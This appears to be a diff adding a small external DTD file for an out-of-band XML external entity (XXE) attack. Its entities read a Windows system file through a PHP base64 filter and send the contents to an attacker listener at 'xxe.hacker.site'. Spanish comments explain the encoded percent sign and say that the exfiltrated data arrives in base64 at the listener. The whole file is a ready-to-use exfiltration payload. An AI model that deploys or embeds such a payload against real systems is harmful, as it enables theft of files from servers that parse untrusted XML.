@@ -1,0 +1,6 @@
+<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini">
+<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://xxe.hacker.site:2108/?p=%resource;'>">
+
+
+<!-------el &#x25 es el porcentaje encodeado----->
+<!-------xxe.hacker.site es el server listener que debemos tener configurado claro, y en resource te llega el contenido en b64----->
